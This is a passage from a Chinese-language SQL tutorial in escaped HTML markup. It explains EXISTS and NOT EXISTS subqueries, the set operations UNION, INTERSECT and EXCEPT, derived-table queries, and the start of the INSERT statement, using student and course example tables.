&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;exists子查询&#34;&gt;EXISTS子查询
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:15px&#34;&gt;&lt;strong&gt;EXISTS代表存在量词，对应的为NOT EXISTS&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:15px&#34;&gt;&lt;strong&gt;EXISTS谓词的子查询不返回数据，只返回逻辑&amp;rsquo;true&amp;rsquo;和&amp;rsquo;false&amp;rsquo;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;eg1.在SC表中查询至少选修了1号学生选修的全部课程（Cno）的学生的学号（Sno)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询学号为 x 的学生，对所有的课程 y，只要 1 号学生选修了课程 y，则 x 也选修了 y。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;令 p 表示&amp;quot;学生 1 号选修了课程 y&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;令 q 表示&amp;quot;学生 x 选修了课程 y&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;则上述查询可以表示为(∀y)p→q&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;通过等价转换，可得(∀y)p→q ≡ ¬(∃y(¬(p→q))) ≡ ¬(∃y(¬(¬p∨q))) ≡ ¬∃y(p∧¬q)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最终用 SQL 实现的表达式 ¬∃y(p∧¬q)，语义：不存在这样的课程 y，学生 1 号选修了 y，而学生 x 没有选修&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;DISTINCT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCX&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EXISTS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;                            &lt;span style=&#34;color:#7f848e&#34;&gt;-- 由EXISTS引I出的子查询，其目标列表达式通常都用*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCY&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EXISTS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         (&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCZ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCZ&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCX&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCZ&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;)   &lt;span style=&#34;color:#7f848e&#34;&gt;-- 保证内外指向相同的学生
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg2.基于 SC 表，查询选修了全部课程（Course 表）的学生姓名（Student 表）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;令 p 表示&amp;quot;课程 x 被学生 y 选修了&amp;quot;，则有(∀x)p ≡ ¬(∃x(¬p))，语义：查询没有任何课程是其不选修的学生 y&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sname&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Student&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EXISTS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Course&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EXISTS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         (&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Student&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Course&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;集合查询&#34;&gt;集合查询
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;多个SELECT语句的结果可以进行集合的并（UNION)、交（INTERSECT)、差（EXCEPT）&lt;/strong&gt;&lt;/span&gt;
&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;参加集合操作的各查询结果的列数必须相同，对应项的数据类型也必须相同&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;union并操作满足前者或满足后者&#34;&gt;UNION并操作（满足前者或满足后者）
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;UNION合并查询结果时，系统会自动去掉重复元组，若需保留，则采用UNIONALL&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.在TAB2中查询学号大于等于23003的学生和选择了MATH科目的学生&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;23003&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UNION&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;intersect交操作前后都满足&#34;&gt;INTERSECT交操作（前后都满足）
&lt;/h4&gt;&lt;p&gt;eg.在TAB2中查询选了MATH又选了history的学生&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;history&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;history&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTERSECT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;except差操作满足前者不满足后者&#34;&gt;EXCEPT差操作（满足前者，不满足后者）
&lt;/h4&gt;&lt;p&gt;eg.在TAB2中查询学号大于23002的学生和选修了MATH的学生的差集&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;23002&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;EXCEPT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CLA2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;MATH&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;基于派生表的查询&#34;&gt;基于派生表的查询
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;子查询出现在FROM子句时，子查询将生成临时的派生表，成为主查询的查询对象&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;FROM (子查询) AS 别名 (属性列名1,属性列名2)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果子查询中没有聚集函数，派生表可以不指定属性列，子查询SELECT子句后面的列名为其默认属性&lt;/strong&gt;
&lt;strong&gt;AS可以省略，但必须为派生表关系指定一个别名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg1.找出每个学生超过他自己选修课程平均成绩的课程号&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;, &lt;span style=&#34;color:#c678dd&#34;&gt;Avg&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Avg_sc&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;avg_sno&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;avg_grade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Avg_sc&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;avg_sno&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Avg_sc&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;avg_grade&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg2.查询所有选修了1号课程的学生姓名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sname&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Student&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Student&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;SC1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;插入数据insert语句&#34;&gt;插入数据&amp;ndash;INSERT语句
&lt;/h2&gt;&lt;h3 id=&#34;插入元组&#34;&gt;插入元组
&lt;/h3&gt;&lt;h4 id=&#34;一般格式-1&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;INSERT&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;INTO 表名(列名1,列名n)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
